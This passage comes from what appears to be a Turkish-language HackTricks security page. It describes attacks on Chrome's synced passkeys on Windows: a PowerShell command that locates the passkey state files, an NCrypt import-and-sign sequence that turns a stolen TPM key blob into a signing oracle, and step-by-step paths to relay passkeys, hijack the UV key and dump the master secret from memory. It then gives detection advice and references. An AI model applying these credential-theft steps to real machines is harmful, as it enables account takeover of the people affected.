Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-bound key blob'ları yerel bir signing oracle olarak yine de kötüye kullanılabilir

Tarayıcı, TPM destekli bir kimlik anahtarını **`NCRYPT_OPAQUE_KEY_BLOB`** olarak dışa aktarır ve bu blob'u kullanıcı tarafından erişilebilir bir durumda saklarsa, malware'in ham özel anahtarı çıkarması **gerekmez**. Blob'u **aynı makinede** yeniden içe aktarabilir ve yerel TPM'den saldırganın kontrolündeki verileri imzalamasını isteyebilir:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Bu, **hardware binding'in cihaz dışına aktarımı engellediği, ancak ele geçirilmiş uç noktada aynı kullanıcı tarafından kullanılmasını engellemediği** anlamına gelir.

### Pratik kötüye kullanım yolları

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Chrome'un LevelDB'inden `WebauthnCredentialSpecifics` kayıtlarını listeleyin.
   - Bir passkey oturumu başlatıp yeni bir WebAuthn challenge alın.
   - Çalınan `wrapped_identity_private_key` blob'unu, cloud-authenticator isteğinin binding'ini imzalamak için kurbanın TPM'inde kullanın.
   - Dönen assertion'ı relying party'ye iletin.
   - Bu yöntem, RP `userVerification=preferred` değerini kabul ediyorsa veya **`UV=0`** olan assertion'ları reddetmiyorsa özellikle değerlidir.
2. **Bekleyen UV-key'in ele geçirilmesi**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state` dosyasını silerek veya geçerli, imzalı bir `device/forget` işlemi göndererek yeniden kaydı zorlayın.
   - Kayıt işlemi cihazı **`uv_key_pending`** durumunda bırakırsa, saldırganın kontrolündeki bir UV public key kaydedin.
   - Sağlayıcı yeni UV key için attestation / secure-hardware origin değerini doğrulamıyorsa, saldırganın key'iyle atılan sonraki imzalar **`UV=1`** olarak değerlendirilir.
3. **Master secret / SDS kurtarma verisinin çalınması**<sup>[[4]](#references)</sup>
   - Chrome'un synced-passkey master secret'ını almasını sağlamak için kurtarma veya yeniden katılma işlemini zorlayın.
   - `passkey_enclave_state` dosyasının yeniden oluşturulmasını/değiştirilmesini izleyin, ardından düz metin **security domain secret (SDS)** bellekte bulunduğu sırada Chrome belleğini dökün.
   - Kurtarılan SDS'yi kullanarak her `WebauthnCredentialSpecifics` kaydındaki şifrelenmiş alanların şifresini çözün ve taşınabilir WebAuthn private key'leri kurtarın.

### DFIR / tespit önerileri

- `passkey_enclave_state` dosyasının **silinmesini/yeniden oluşturulmasını** izleyin.<sup>[[4]](#references)</sup>
- Tarayıcı dışındaki süreçlerin Chrome **`Sync Data\LevelDB`** konumuna anormal erişimi olduğunda uyarı verin.
- **Chrome bellek dökümleri** veya şüpheli süreçler arası bellek erişimi olduğunda uyarı verin.
- Tekrarlanan **Google Password Manager kurtarma PIN'i** istemlerini veya beklenmeyen yeniden kayıt işlemlerini araştırın.
- WebAuthn **`signCount`** değerinin, senkronize passkey'lerde çoğunlukla işe yaramadığını ve sabit kalabileceğini unutmayın; bu nedenle klasik clone tespiti etkisizdir.

## References

- [1] [Unit 42 – Yüksek Değerli Sektörleri Hedef Alan ve Yıllarca Tespit Edilemeyen Operasyonlara İlişkin Bir İnceleme](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgilerinin şifresinin çözülmesi → SYSTEM yetkisi için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragon'un İç Yüzü: Relay Network'ün ve Gizli Saldırı Operasyonunun İşleyişinin Ortaya Çıkarılması](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Parolasız Kimlik Doğrulamada Yeni Bir Saldırı Yüzeyi](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory Data Store'un Gerçekte Nasıl Çalıştığı: NTDS.dit'in İç Yüzü (Bölüm 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Uzak Lsass Bellek Dökümünden Parolaları Alma](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho, Still Toolkit ile Siber Casusluk Araçlarını Genişletiyor](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW işlevi ve `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` yedekleme modu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram SSS – etkin oturumları sonlandırma](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
